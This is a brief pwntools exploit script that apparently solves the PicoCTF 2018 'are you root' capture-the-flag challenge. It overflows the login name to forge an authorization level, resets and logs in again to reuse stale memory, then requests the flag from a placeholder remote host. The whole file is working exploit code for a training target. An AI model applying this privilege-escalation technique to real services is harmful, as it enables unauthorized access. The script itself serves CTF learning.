from pwn import *
 
#p = process('./PicoCTF_2018_are_you_root')
p = remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
 

p.sendlineafter('>','login ' + 'a'*0x8 + '\x05')
 
p.sendlineafter('>','reset')

p.sendlineafter('>','login aa') #这个aa可以随便输入,只要有并且不溢出就好

p.sendlineafter('>','get-flag')
p.interactive()
